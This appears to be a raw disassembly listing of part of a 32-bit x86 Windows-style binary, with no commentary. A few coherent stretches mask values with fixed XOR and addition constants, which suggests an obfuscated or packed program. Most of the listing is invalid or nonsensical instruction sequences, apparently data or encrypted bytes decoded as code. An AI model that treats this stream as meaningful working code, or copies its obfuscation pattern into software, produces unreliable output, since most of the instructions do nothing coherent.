  40c3be:	add    dl,BYTE PTR fs:0x52f1b530
  40c3c5:	mov    ecx,edi
  40c3c7:	xor    eax,0x441ec64f
  40c3cc:	pop    ebx
  40c3cd:	in     al,0x57
  40c3cf:	loopne 0x40c39c
  40c3d1:	sub    al,0xe2
  40c3d3:	je     0x40c35d
  40c3d5:	pop    DWORD PTR [edx-0x4054c37a]
  40c3db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c3dc:	cmp    DWORD PTR [eax+0x5311dc3],ebp
  40c3e2:	push   esp
  40c3e3:	in     eax,dx
  40c3e4:	out    dx,eax
  40c3e5:	xor    eax,0xfc458bf5
  40c3ea:	mov    ecx,0x7510854
  40c3ef:	xor    eax,ecx
  40c3f1:	mov    edx,0x32729b
  40c3f6:	add    eax,edx
  40c3f8:	mov    DWORD PTR [ebp+0x8],eax
  40c3fb:	mov    eax,DWORD PTR [ebp-0x18]
  40c3fe:	xor    eax,ecx
  40c400:	add    eax,edx
  40c402:	mov    edx,DWORD PTR [ebp+0x14]
  40c405:	imul   eax,DWORD PTR [edx]
  40c408:	mov    edx,DWORD PTR [ebp-0x4]
  40c40b:	xor    edx,ecx
  40c40d:	mov    ecx,DWORD PTR [ebp+0x8]
  40c410:	lea    ecx,[edx+ecx*1+0x32729b]
  40c417:	cmp    ecx,eax
  40c419:	je     0x40cbb9
  40c41f:	mov    edi,DWORD PTR [ebp-0x18]
  40c422:	mov    eax,DWORD PTR [ebp+0x8]
  40c425:	mov    edx,DWORD PTR [ebp+0x14]
  40c428:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  40c42c:	mov    ecx,0x7510854
  40c431:	xor    edx,edx
  40c433:	xor    edi,ecx
  40c435:	jmp    0x40c698
  40c43a:	dec    ebp
  40c43b:	scas   al,BYTE PTR es:[edi]
  40c43c:	push   ss
  40c43d:	pop    ebx
  40c43e:	cmc    
  40c43f:	arpl   WORD PTR [ecx-0x58],si
  40c442:	pop    esi
  40c443:	clc    
  40c444:	push   ss
  40c445:	shl    DWORD PTR [eax*8-0x7deb3fff],cl
  40c44c:	jle    0x40c4cc
  40c44e:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40c452:	imul   esi,esi,0xffffffec
  40c455:	loope  0x40c456
  40c457:	mov    edi,DWORD PTR [ebx+edx*2]
  40c45a:	and    al,0x42
  40c45c:	popf   
  40c45d:	ret    0x953b
  40c460:	in     eax,0x81
  40c462:	push   edx
  40c463:	mov    ds:0xf9d3d56d,al
  40c468:	shl    DWORD PTR [esi-0x3b10df4a],cl
  40c46e:	sub    al,BYTE PTR [edx-0x6069021]
  40c474:	fcos   
  40c476:	or     al,0xb1
  40c478:	adc    DWORD PTR [edi+0x3fe00a8],ebx
  40c47e:	popa   
  40c47f:	ss xor eax,0x65d1f33
  40c485:	xchg   BYTE PTR [eax],dh
  40c487:	xor    edx,DWORD PTR [ebp-0x19]
  40c48a:	xor    cl,al
  40c48c:	cld    
  40c48d:	sti    
  40c48e:	mov    ecx,0x40e8d96d
  40c493:	dec    ecx
  40c494:	mov    bl,0xd3
  40c496:	and    edx,ebp
  40c498:	jae    0x40c45b
  40c49a:	fcom   DWORD PTR [ecx-0x7c]
  40c49d:	popf   
  40c49e:	or     dh,dl
  40c4a0:	adc    ebx,DWORD PTR [ebp-0x6129adf8]
  40c4a6:	adc    BYTE PTR [esi+ebx*1+0x77],ah
  40c4aa:	test   DWORD PTR [edi-0x26],esp
  40c4ad:	test   BYTE PTR ds:0xc7f01be6,ch
  40c4b3:	loope  0x40c516
  40c4b5:	sub    esi,DWORD PTR [esi-0x49ea0a1]
  40c4bb:	ficom  DWORD PTR [ecx+0x5b217452]
  40c4c1:	addr16 dec ebx
  40c4c3:	les    esp,FWORD PTR [ebp+0x46450abb]
  40c4c9:	jg     0x40c537
  40c4cb:	test   eax,0xc213b94f
  40c4d0:	std    
  40c4d1:	mov    ecx,0xe15b8aac
  40c4d6:	xchg   ecx,eax
  40c4d7:	enter  0x73a5,0x12
  40c4db:	ret    0xb40d
  40c4de:	outs   dx,DWORD PTR ds:[esi]
  40c4df:	leave  
  40c4e0:	jns    0x40c535
  40c4e2:	and    al,0x6e
  40c4e4:	popa   
  40c4e5:	stos   DWORD PTR es:[edi],eax
  40c4e6:	retf   0x27c6
  40c4e9:	xor    cl,dh
  40c4eb:	add    eax,0x13a690f6
  40c4f0:	into   
  40c4f1:	xchg   edx,eax
  40c4f2:	adc    edx,DWORD PTR [ecx-0x50]
  40c4f5:	retf   
  40c4f6:	or     bh,BYTE PTR [ebx]
  40c4f8:	cwde   
  40c4f9:	jb     0x40c542
  40c4fb:	out    dx,eax
  40c4fc:	int3   
  40c4fd:	jl     0x40c4bb
  40c4ff:	rcl    bh,1
  40c501:	adc    edi,DWORD PTR [ebp+0x63ed0bbb]
  40c507:	dec    ebp
  40c508:	enter  0x76bc,0x18
  40c50c:	jecxz  0x40c4b4
  40c50e:	fcomip st,st(6)
  40c510:	sahf   
  40c511:	cwde   
  40c512:	xor    ah,BYTE PTR [edi]
  40c514:	lahf   
  40c515:	mov    BYTE PTR [edx-0x7e],al
  40c518:	ret    0xac9a
  40c51b:	repnz push esp
  40c51d:	sub    eax,0x191b5762
  40c522:	dec    ecx
  40c523:	xchg   cx,ax
  40c525:	loope  0x40c4e7
  40c527:	jno    0x40c4da
  40c529:	pop    ds
  40c52a:	mov    esp,0x335d250b
  40c52f:	loope  0x40c51a
  40c531:	call   0x9f8d:0xa515ea73
  40c538:	pop    ebx
  40c539:	lock out 0x39,al
  40c53c:	xor    ah,BYTE PTR [ebx-0x20]
  40c53f:	(bad)  
  40c540:	mov    esi,0xec495b91
  40c545:	dec    ebx
  40c546:	mov    bh,0x5
  40c548:	scas   al,BYTE PTR es:[edi]
  40c549:	pop    ds
  40c54a:	fs xchg esi,edi
  40c54d:	call   0x5e2e:0x6ee78be2
  40c554:	jo     0x40c54c
  40c556:	(bad)  
  40c557:	cdq    
  40c558:	pop    ebp
  40c559:	rcr    DWORD PTR [ecx+0x50],cl
  40c55c:	xchg   edi,eax
  40c55d:	(bad)  [eax+ecx*2+0x2a]
  40c561:	sbb    eax,0x294814ae
  40c566:	popf   
  40c567:	sbb    dh,BYTE PTR [edx-0x700a355d]
  40c56d:	leave  
  40c56e:	scas   eax,DWORD PTR es:[edi]
  40c56f:	(bad)  
  40c570:	fild   WORD PTR [ebx+0x15]
  40c574:	push   ebx
  40c576:	(bad)  
  40c577:	int3   
  40c578:	cmp    ch,al
  40c57a:	xor    BYTE PTR [esi-0x79],cl
  40c57d:	fstp   TBYTE PTR [ebp-0xa]
  40c580:	cmp    DWORD PTR [ecx-0x18],ebp
  40c583:	mov    ebp,0x3df780fd
  40c588:	xor    esi,DWORD PTR [eax-0x40]
  40c58b:	dec    esi
  40c58c:	mov    esi,0xf680204c
  40c591:	cmp    edi,ebx
  40c593:	sar    BYTE PTR [ebx+0x5],1
  40c596:	aaa    
  40c597:	in     al,0x3b
  40c599:	xor    BYTE PTR [ebp-0x74],0x9f
  40c59d:	jge    0x40c605
  40c59f:	hlt    
  40c5a0:	lods   al,BYTE PTR ds:[esi]
  40c5a1:	retf   0x28b2
  40c5a4:	jl     0x40c561
  40c5a6:	adc    al,0x26
  40c5a8:	repnz loopne 0x40c616
  40c5ab:	mov    ecx,DWORD PTR [ebx+0x54]
  40c5ae:	jo     0x40c62a
  40c5b0:	and    eax,0x4f6558d0
  40c5b5:	push   0x3b
  40c5b7:	shr    BYTE PTR [edx+0x45],0x53
  40c5bb:	sbb    DWORD PTR [ebx+0x4735643e],ecx
  40c5c1:	and    eax,DWORD PTR [eax+0x3bcdbbfe]
  40c5c7:	mov    eax,0xb1fc547
  40c5cc:	(bad)  
  40c5cd:	inc    ecx
  40c5ce:	jp     0x40c63d
  40c5d0:	popa   
  40c5d1:	push   ds
  40c5d2:	pop    edi
  40c5d3:	sti    
  40c5d4:	leave  
  40c5d5:	mov    ecx,edi
  40c5d7:	dec    edx
  40c5d8:	jnp    0x40c566
  40c5da:	pop    es
  40c5db:	mov    ah,0x2
  40c5dd:	fild   QWORD PTR [ebx+edi*4-0x69]
  40c5e1:	inc    ebp
  40c5e2:	bound  edx,QWORD PTR [edx-0x4a5122af]
  40c5e8:	mov    eax,ds:0x19e03e5e
  40c5ed:	lds    edx,FWORD PTR [esi+0x21be7b62]
  40c5f3:	mov    BYTE PTR [edi-0x26],bl
  40c5f6:	jecxz  0x40c58b
  40c5f8:	inc    ebp
  40c5f9:	jle    0x40c590
  40c5fb:	jb     0x40c5b0
  40c5fd:	dec    ebx
  40c5fe:	sbb    al,0x23
  40c600:	xchg   ebp,eax
  40c601:	add    eax,DWORD PTR [ecx+0x5831ab7d]
  40c607:	cs jle 0x40c5f9
  40c60a:	and    ch,cl
  40c60c:	iret   
  40c60d:	dec    ecx
  40c60e:	jge    0x40c5fc
  40c610:	pusha  
  40c611:	push   esi
  40c612:	mov    ebx,DWORD PTR [esi]
  40c614:	or     BYTE PTR [edx],dh
  40c616:	add    al,0x67
  40c618:	ret    
  40c619:	fwait
  40c61a:	mov    esi,0x8c39cb85
  40c61f:	dec    edx
  40c620:	add    BYTE PTR [ebx+edi*8-0x2783c7d3],0xaf
  40c628:	push   cs
  40c629:	daa    
  40c62a:	sub    BYTE PTR [edx+0x6],bh
  40c62d:	ud2    
  40c62f:	enter  0x1861,0x4d
  40c633:	test   DWORD PTR [esp+eiz*2+0x5b436307],ecx
  40c63a:	add    DWORD PTR [ecx-0x515af569],ebp
  40c640:	fiadd  WORD PTR [eax]
  40c642:	cmp    esp,ecx
  40c644:	xchg   esp,eax
  40c645:	mov    eax,0xc26de8ca
  40c64a:	dec    esi
  40c64b:	dec    esi
  40c64c:	lock jne 0x40c5d0
  40c64f:	pop    ebp
  40c650:	(bad)  
  40c651:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c652:	dec    edx
  40c653:	jecxz  0x40c5db
  40c655:	fcomp  st(2)
  40c657:	iret   
  40c658:	mov    al,BYTE PTR [ebx]
  40c65a:	cld    
  40c65b:	push   edi
  40c65c:	push   ss
  40c65d:	pop    ebp
  40c65e:	add    al,0x23
  40c660:	scas   eax,DWORD PTR es:[edi]
  40c661:	xor    eax,0x995f9385
  40c666:	jb     0x40c6a4
  40c668:	adc    BYTE PTR [edx],dh
  40c66a:	addr16 and al,0xc8
  40c66d:	jne    0x40c674
  40c66f:	dec    edx
  40c670:	enter  0xf6f3,0x3a
  40c674:	or     al,0x6c
  40c676:	add    eax,0xef1266e4
  40c67b:	lods   al,BYTE PTR ds:[esi]
  40c67c:	(bad)  
  40c67d:	in     al,dx
  40c67e:	adc    al,0x4c
  40c680:	in     eax,0xa8
  40c682:	jno    0x40c6f9
  40c684:	mov    ds:0x8064e74c,al
  40c689:	fiadd  WORD PTR [esi+0x712beda4]
  40c68f:	test   cl,0x86
  40c692:	outs   dx,DWORD PTR ds:[esi]
  40c693:	push   edx
  40c694:	out    dx,eax
  40c695:	(bad)  
  40c696:	sbb    dl,BYTE PTR [edx+0x32729bbe]
  40c69c:	add    BYTE PTR [ebx],al
  40c69e:	(bad)  
  40c69f:	div    edi
  40c6a1:	mov    edx,DWORD PTR [ebp-0x4]
  40c6a4:	xor    edx,ecx
  40c6a6:	lea    eax,[edx+eax*1+0x32729b]
  40c6ad:	mov    edx,DWORD PTR [ebp+0x8]
  40c6b0:	mov    edi,DWORD PTR [ebp-0x24]
  40c6b3:	mov    DWORD PTR [edi+edx*4],eax
  40c6b6:	mov    eax,DWORD PTR [ebp-0x18]
  40c6b9:	mov    edx,DWORD PTR [ebp+0x8]
  40c6bc:	xor    eax,ecx
  40c6be:	lea    eax,[eax+edx*1+0x32729b]
  40c6c5:	mov    DWORD PTR [ebp+0x8],eax
  40c6c8:	mov    eax,DWORD PTR [ebp-0x18]
  40c6cb:	jmp    0x40c92e
  40c6d0:	leave  
  40c6d1:	adc    bl,ah
  40c6d3:	cmp    eax,0x10f1ede3
  40c6d8:	xor    BYTE PTR [ebp-0x691a653f],dl
  40c6de:	dec    eax
  40c6df:	(bad)  
  40c6e0:	fiadd  WORD PTR [eax+0x7c387e7e]
  40c6e6:	jle    0x40c766
  40c6e8:	aad    0x69
  40c6ea:	xor    eax,0x3cd71fb7
  40c6ef:	dec    ecx
  40c6f0:	mov    eax,?
  40c6f2:	ins    WORD PTR es:[edi],dx
  40c6f4:	fnstcw WORD PTR [ecx]
  40c6f6:	aam    0x26
  40c6f8:	pop    ebp
  40c6f9:	mov    ds:0x3b90c5c2,al
  40c6fe:	jno    0x40c72b
  40c700:	add    eax,0xcc89701a
  40c705:	mov    ecx,0x608f3ee9
  40c70a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c70b:	in     eax,0xd6
  40c70d:	or     ch,BYTE PTR [edx-0x190d1109]
  40c713:	fld    TBYTE PTR [esi-0x660935e4]
  40c719:	imul   esi,DWORD PTR [edx-0x79],0x4ffb5267
  40c720:	leave  
  40c721:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c722:	xchg   DWORD PTR [ecx+edi*2],ecx
  40c725:	sti    
  40c726:	lods   eax,DWORD PTR ds:[esi]
  40c727:	add    ch,cl
  40c729:	add    BYTE PTR [ecx-0x53e6d753],0xf1
  40c730:	cdq    
  40c731:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c732:	xor    bl,BYTE PTR [edi+0x34478928]
  40c738:	xor    al,0xdb
  40c73a:	retf   0x6ca0
  40c73d:	hlt    
  40c73e:	leave  
  40c73f:	jae    0x40c753
  40c741:	dec    ebx
  40c742:	sub    DWORD PTR [edi+0x24],ebp
  40c745:	xchg   edi,eax
  40c746:	pop    edx
  40c747:	(bad)  
  40c748:	sbb    esi,DWORD PTR [edi-0x2b]
  40c74b:	xchg   DWORD PTR [ecx],ebp
  40c74d:	jl     0x40c702
  40c74f:	out    0xcf,eax
  40c751:	jmp    0x2841:0x684551f8
  40c758:	push   edx
  40c759:	repz mov WORD PTR [ebp-0x1850b233],ds
  40c760:	add    BYTE PTR [eax+0x5a],dl
  40c763:	mov    DWORD PTR [bx+di],ecx
  40c766:	push   cs
  40c767:	mov    al,0x1e
  40c769:	mov    BYTE PTR [eax],0xbc
  40c76c:	stos   DWORD PTR es:[edi],eax
  40c76d:	out    dx,al
  40c76e:	rol    ebp,cl
  40c770:	in     al,dx
  40c771:	sar    DWORD PTR [ebp+0x440d1c80],cl
  40c777:	push   ecx
  40c778:	and    al,0xa2
  40c77a:	mov    DWORD PTR ds:[ecx-0x266c554b],ebp
  40c781:	add    al,0xf7
  40c783:	test   dh,ch
  40c785:	imul   edx,edi,0x498bfa0c
  40c78b:	inc    ebp
  40c78c:	loope  0x40c7cc
  40c78e:	cmp    eax,0x5eb912a7
  40c793:	mov    ds,WORD PTR [edi+0x2f]
  40c796:	jne    0x40c79c
  40c798:	fbld   TBYTE PTR ds:0xd768bbfa
  40c79e:	fstp   TBYTE PTR [ebp+0x60d830a0]
  40c7a4:	cmp    DWORD PTR [ebx-0x2a],ebp
  40c7a7:	push   ebx
  40c7a8:	adc    eax,0xb4c07131
  40c7ad:	xlat   BYTE PTR ds:[ebx]
  40c7ae:	pusha  
  40c7af:	mov    bl,0x4a
  40c7b1:	sahf   
  40c7b2:	mov    al,0xa6
  40c7b4:	jge    0x40c82d
  40c7b6:	mov    dl,0xd0
  40c7b8:	(bad)  
  40c7b9:	aam    0xae
  40c7bb:	movzx  ecx,BYTE PTR [eax-0x73b14721]
  40c7c2:	je     0x40c78e
  40c7c4:	div    ebp
  40c7c6:	loopne 0x40c7b9
  40c7c8:	jo     0x40c7a8
  40c7ca:	(bad)  
  40c7cb:	loop   0x40c7d0
  40c7cd:	(bad)  
  40c7ce:	xor    DWORD PTR [ebp-0x2b07a034],edi
  40c7d4:	outs   dx,BYTE PTR ds:[esi]
  40c7d5:	jno    0x40c7b5
  40c7d7:	leave  
  40c7d8:	jmp    0x6ad0bbcb
  40c7dd:	push   esp
  40c7de:	sti    
  40c7df:	push   ss
  40c7e0:	mov    ebx,0x96d9fb78
  40c7e5:	dec    edx
  40c7e6:	or     DWORD PTR [esi],esp
  40c7e8:	rcr    bh,0x53
  40c7eb:	cmp    BYTE PTR [edx+0x184dab91],0x87
  40c7f2:	pop    edi
  40c7f3:	aaa    
  40c7f4:	xor    al,0x60
  40c7f6:	mov    ah,BYTE PTR [esi+eiz*8]
  40c7f9:	mov    esp,0xc9f1bf63
  40c7fe:	and    eax,0x380bd0ac
  40c803:	stos   BYTE PTR es:[edi],al
  40c804:	lods   eax,DWORD PTR ds:[esi]
  40c805:	add    al,0xa1
  40c807:	xchg   DWORD PTR [eax],ebp
  40c809:	cmp    al,0xc2
  40c80b:	push   edi
  40c80c:	enter  0x9de9,0xed
  40c810:	cwde   
  40c811:	mov    bl,0x9f
  40c813:	xor    DWORD PTR [esi-0x7437ae8c],esp
  40c819:	clc    
  40c81a:	fisttp WORD PTR [edx-0x7f]
  40c81d:	add    DWORD PTR [ecx-0x2c3dd262],esp
  40c823:	pop    ds
  40c824:	iret   
  40c825:	sti    
  40c826:	(bad)  
  40c827:	adc    eax,0x862459f9
  40c82c:	xor    eax,0xe54864ef
  40c831:	stos   BYTE PTR es:[edi],al
  40c832:	inc    esi
  40c833:	es inc esi
  40c835:	test   BYTE PTR ds:0xf8b5479b,0x48
  40c83c:	push   edi
  40c83d:	push   0xfe38e077
  40c842:	or     al,0xa6
  40c844:	and    al,0x76
  40c846:	xchg   ecx,eax
  40c847:	sub    ch,BYTE PTR [ecx+0x6a]
  40c84a:	jmp    0x40c870
  40c84c:	xor    eax,0xf9554f17
  40c851:	sub    al,BYTE PTR [edi]
  40c853:	iret   
  40c854:	pop    esi
  40c855:	inc    ebp
  40c856:	inc    esp
  40c857:	xor    eax,eax
  40c859:	cld    
  40c85a:	jbe    0x40c885
  40c85c:	ret    
  40c85d:	and    eax,0xa5738d8b
  40c862:	xchg   ecx,eax
  40c863:	stc    
  40c864:	xchg   esp,eax
  40c865:	inc    esp
  40c866:	fs icebp 
  40c868:	xchg   DWORD PTR [esi+0x13],eax
  40c86b:	pop    esi
  40c86c:	js     0x40c8a0
  40c86e:	test   al,0xfe
  40c870:	fisub  DWORD PTR [edi]
  40c872:	fs push ebx
  40c874:	in     eax,dx
  40c875:	sbb    BYTE PTR [esi],bl
  40c877:	pop    ds
  40c878:	pushf  
  40c879:	rol    ecx,cl
  40c87b:	mov    ah,0x1c
  40c87d:	test   ah,0x5d
  40c880:	fld    TBYTE PTR [eax-0x71e64ac9]
  40c886:	sub    ecx,DWORD PTR [ebx-0x48]
  40c889:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c88a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c88b:	mov    al,0x8e
  40c88d:	adc    bh,BYTE PTR [eax]
  40c88f:	cmp    dl,BYTE PTR [eax+0x60d15ea7]
  40c895:	rcr    BYTE PTR [ebp-0x16580cfb],0x34
  40c89c:	sahf   
  40c89d:	adc    BYTE PTR [ecx],0x86
  40c8a0:	ret    0x3c96
  40c8a3:	jbe    0x40c868
  40c8a5:	pop    ebx
  40c8a6:	icebp  
  40c8a7:	out    dx,al
  40c8a8:	ins    BYTE PTR es:[edi],dx
  40c8a9:	call   0x1f64:0x8ac13b43
  40c8b0:	jnp    0x40c85e
  40c8b2:	sbb    BYTE PTR [ecx+esi*2],ah
  40c8b5:	imul   ecx,DWORD PTR [ecx+0x447980b5],0x3f
  40c8bc:	push   es
  40c8bd:	test   DWORD PTR [ebx],esi
  40c8bf:	pushf  
  40c8c0:	dec    esi
  40c8c1:	jle    0x40c88e
  40c8c3:	bsf    esi,DWORD PTR [ecx+eax*8-0x749e7659]
  40c8cb:	enter  0x6214,0x41
  40c8cf:	push   ecx
  40c8d0:	xchg   ebx,eax
  40c8d1:	dec    ebp
  40c8d2:	outs   dx,DWORD PTR ds:[esi]
  40c8d3:	jl     0x40c859
  40c8d5:	(bad)  
  40c8d6:	jmp    0x5cb3:0x59adae5e
  40c8dd:	pusha  
  40c8de:	stos   BYTE PTR es:[edi],al
  40c8df:	retf   
  40c8e0:	mov    edi,0x5102c989
  40c8e5:	push   edx
  40c8e6:	cwde   
  40c8e7:	inc    edi
  40c8e8:	(bad)  
  40c8e9:	scas   eax,DWORD PTR es:[edi]
  40c8ea:	cmp    eax,0x10cc45a8
  40c8ef:	pop    es
  40c8f0:	adc    DWORD PTR [esi],ebp
  40c8f2:	shl    DWORD PTR [edx],1
  40c8f4:	mov    edi,DWORD PTR [ecx]
  40c8f6:	xor    al,0x59
  40c8f8:	dec    ebp
  40c8f9:	or     BYTE PTR [ebp+0x3d],cl
  40c8fc:	jg     0x40c958
  40c8fe:	mov    ebp,0x1eb15716
  40c903:	shr    ah,0xf7
  40c906:	inc    edx
  40c907:	fst    QWORD PTR [ebp-0x2740c716]
  40c90d:	daa    
  40c90e:	xchg   ebx,eax
  40c90f:	sbb    eax,0x39b73956
  40c914:	call   0x6e185b7b
  40c919:	xchg   esi,eax
  40c91a:	cmc    
  40c91b:	lock loope 0x40c973
  40c91e:	cmp    al,0x73
  40c920:	inc    eax
  40c921:	or     cl,BYTE PTR [ebp+esi*1+0x6d]
  40c925:	xchg   BYTE PTR ds:0xb64b5684,bl
  40c92b:	out    0xfd,al
  40c92d:	sub    al,0x8b
  40c92f:	push   ebp
  40c930:	adc    al,0x33
  40c932:	shr    ecx,0x5e
  40c935:	add    al,BYTE PTR [eax]
  40c937:	add    BYTE PTR [edi],al
  40c939:	mov    ah,0x6
  40c93b:	cwde   
  40c93c:	mov    ch,0xa8
  40c93e:	mov    eax,ds:0x31ca67b1
  40c943:	cmp    eax,eax
  40c945:	add    esp,ebx
  40c947:	retf   0x8e98
  40c94a:	jle    0x40c9ca
  40c94c:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40c950:	loopne 0x40c935
  40c952:	mov    bl,0x4a
  40c954:	adc    dh,ah
  40c956:	or     eax,0xa490c393
  40c95b:	push   esi
  40c95c:	mov    al,ds:0x71b3f76a
  40c961:	mov    BYTE PTR [edx],al
  40c963:	sbb    DWORD PTR [ebp-0x4e],esi
  40c966:	xchg   BYTE PTR [ecx-0x337ec9fd],dh
  40c96c:	div    BYTE PTR [eax-0x13063934]
  40c972:	or     DWORD PTR [ecx+0x676e64af],0xb16469fe
  40c97c:	push   ebp
  40c97d:	cmp    BYTE PTR [edi-0x54],ah
  40c980:	adc    DWORD PTR [eax+0x6f792464],0xfffffff0
  40c987:	loopne 0x40c9ed
  40c989:	test   eax,0x6ea56007
  40c98e:	iret   
  40c98f:	fs in  eax,dx
  40c991:	dec    eax
  40c992:	in     eax,0x77
  40c994:	mov    cl,BYTE PTR [esi-0x29]
  40c997:	fcmovnbe st,st(4)
  40c999:	js     0x40c94f
  40c99b:	mov    ds:0xbb56237b,al
  40c9a0:	fimul  WORD PTR [edi+edi*8+0x10]
  40c9a4:	in     eax,dx
  40c9a5:	dec    ebp
  40c9a6:	jo     0x40c939
  40c9a8:	fidiv  DWORD PTR [ebp-0x14]
  40c9ab:	test   al,0xef
  40c9ad:	int    0xbc
  40c9af:	jbe    0x40c9fc
  40c9b1:	rol    BYTE PTR [ebp-0x30],1
  40c9b4:	sbb    BYTE PTR [edi],0x58
  40c9b7:	xor    DWORD PTR [edi-0x53],0xffffffea
  40c9bb:	xor    DWORD PTR [eax-0xe99c378],ecx
  40c9c1:	lods   al,BYTE PTR ds:[esi]
  40c9c2:	(bad)  
  40c9c3:	cmp    eax,0x7c8ff909
  40c9c8:	or     eax,0x6ad3fc90
  40c9cd:	test   dh,al
  40c9cf:	cmp    al,0x54
  40c9d1:	addr16 icebp 
  40c9d3:	inc    esi
  40c9d4:	mov    ah,ah
  40c9d6:	sbb    eax,0xb467597f
  40c9db:	pop    ss
  40c9dc:	repnz arpl WORD PTR [edi-0x6c],bp
  40c9e0:	sub    DWORD PTR [ecx],eax
  40c9e2:	dec    edi
  40c9e3:	loopne 0x40c97b
  40c9e5:	pop    esp
  40c9e6:	xchg   edx,eax
  40c9e7:	add    eax,DWORD PTR [esi-0x4c23123c]
  40c9ed:	ins    BYTE PTR es:[edi],dx
  40c9ee:	call   0xf740:0xa8c485c
  40c9f5:	pop    es
  40c9f6:	scas   al,BYTE PTR es:[edi]
  40c9f7:	(bad)  
  40c9f8:	mov    ah,0xe9
  40c9fa:	or     al,0x91
  40c9fc:	push   esi
  40c9fd:	inc    edi
  40c9fe:	pop    ss
  40c9ff:	(bad)  ds:0x4aa7991e
  40ca05:	dec    esp
  40ca06:	fadd   DWORD PTR [ebx-0xc]
  40ca09:	push   0xc2877b85
  40ca0e:	sbb    BYTE PTR [edx],dl
  40ca10:	lods   al,BYTE PTR ds:[esi]
  40ca11:	adc    al,ah
  40ca13:	xchg   edx,eax
  40ca14:	jo     0x40ca6a
  40ca16:	jo     0x40ca6c
  40ca18:	rcl    dl,cl
  40ca1a:	pop    edi
  40ca1b:	fcomp  QWORD PTR [edi+0x79]
  40ca1e:	lds    esi,FWORD PTR [esi+0x24]
  40ca21:	jo     0x40ca77
  40ca23:	(bad)  
  40ca25:	push   ss
  40ca26:	push   edx
  40ca27:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ca28:	int3   
  40ca29:	fs in  al,0x49
  40ca2c:	sub    ch,cl
  40ca2e:	fcomi  st,st(0)
  40ca30:	test   ecx,ecx
  40ca32:	pop    ebx
  40ca33:	popf   
  40ca34:	ror    DWORD PTR [esi-0x76874875],0x1e
  40ca3b:	ret    
  40ca3c:	sti    
  40ca3d:	xor    bh,BYTE PTR [ecx+esi*4]
  40ca40:	xchg   esp,eax
  40ca41:	mov    ch,BYTE PTR [esi]
  40ca43:	icebp  
  40ca44:	clc    
  40ca45:	cmp    eax,0xd8517393
  40ca4a:	push   es
  40ca4b:	mov    ds:0xb6e7c155,eax
  40ca50:	xlat   BYTE PTR ds:[ebx]
  40ca51:	push   ds
  40ca52:	es dec esp
  40ca54:	sar    BYTE PTR [edi],cl
  40ca56:	retf   
  40ca57:	ss retf 
  40ca59:	push   ax
  40ca5b:	dec    edi
  40ca5c:	fnstenv [ecx+0x79]
  40ca5f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ca60:	in     al,0x75
  40ca62:	xchg   ebx,eax
  40ca63:	sbb    ah,bl
  40ca65:	jmp    0x40ca5a
  40ca67:	in     eax,dx
  40ca68:	pop    edx
  40ca69:	stos   BYTE PTR es:[edi],al
  40ca6a:	jl     0x40c9ee
  40ca6c:	push   esi
  40ca6d:	in     al,0xb1
  40ca6f:	bound  ebx,QWORD PTR [ecx]
  40ca71:	mov    ah,0xa3
  40ca74:	mov    bh,0xa
  40ca76:	xchg   ebx,eax
  40ca77:	out    dx,al
  40ca78:	mov    ah,0xdc
  40ca7a:	jmp    0x40ca30
  40ca7c:	jmp    0x585e:0xd9d49750
  40ca83:	rcl    DWORD PTR [ecx+0x7d017a8c],cl
  40ca89:	push   eax
  40ca8a:	sti    
  40ca8b:	and    eax,0x67ad8a95
  40ca90:	call   0xaa4d:0x2af58769
  40ca97:	push   esi
  40ca98:	mov    ebp,0xc74123b9
  40ca9d:	enter  0xd31e,0x2a
  40caa1:	les    ebp,FWORD PTR [ebx+0x3c]
  40caa4:	pop    ss
  40caa5:	mov    BYTE PTR [ebx+0x38],dl
  40caa8:	(bad)  
  40caa9:	lahf   
  40caaa:	dec    eax
  40caab:	adc    al,BYTE PTR [eax]
  40caad:	in     al,dx
  40caae:	sbb    al,0x89
  40cab0:	ja     0x40caca
  40cab2:	ins    DWORD PTR es:[edi],dx
  40cab3:	jl     0x40ca8f
  40cab5:	push   eax
  40cab6:	retf   0x189b
  40cab9:	push   ecx
  40caba:	or     DWORD PTR ds:0x5230b820,ebp
  40cac0:	fs popa 
  40cac2:	xchg   ecx,eax
  40cac3:	out    dx,eax
  40cac4:	cli    
  40cac5:	fstp   QWORD PTR [ebx-0x3bec1aae]
  40cacb:	add    bh,dh
  40cacd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cace:	pop    ds
  40cacf:	sbb    BYTE PTR [edx],cl
  40cad1:	adc    esi,DWORD PTR [ecx]
  40cad3:	cmp    al,0x14
  40cad5:	jl     0x40cb12
  40cad7:	int3   
  40cad8:	out    0x76,eax
  40cada:	test   eax,0x8300fd89
  40cadf:	repnz adc ch,bh
  40cae2:	sub    bl,dl
  40cae4:	mov    ds:0x8d85a05e,al
  40cae9:	mov    ds:0x27aa3ebf,eax
  40caee:	mov    esi,0x57cde0a4
  40caf3:	in     al,dx
  40caf4:	loop   0x40cafa
  40caf6:	adc    bl,cl
  40caf8:	jae    0x40cb3c
  40cafa:	or     ch,al
  40cafc:	mov    edi,0xe7b5de4b
  40cb01:	sbb    DWORD PTR [ecx+edx*1-0xe],ebp
  40cb05:	jne    0x40cab9
  40cb07:	cmp    ecx,esp
  40cb09:	loope  0x40cb06
  40cb0b:	sub    al,0x54
  40cb0d:	or     DWORD PTR [ecx+0x2905a248],eax
  40cb13:	push   edx
  40cb14:	pop    edi
  40cb15:	mov    ds:0xbe7956f5,eax
  40cb1a:	xor    eax,DWORD PTR [ebx]
  40cb1c:	xlat   BYTE PTR ds:[ebx]
  40cb1d:	xchg   DWORD PTR [esi-0x108f28cf],edx
  40cb23:	add    cl,BYTE PTR [edx]
  40cb25:	in     al,0xa5
  40cb27:	add    dl,BYTE PTR [eax-0xab03368]
  40cb2d:	push   ebp
  40cb2e:	pop    esp
  40cb2f:	aad    0x22
  40cb31:	or     bl,BYTE PTR [ecx+0x7a]
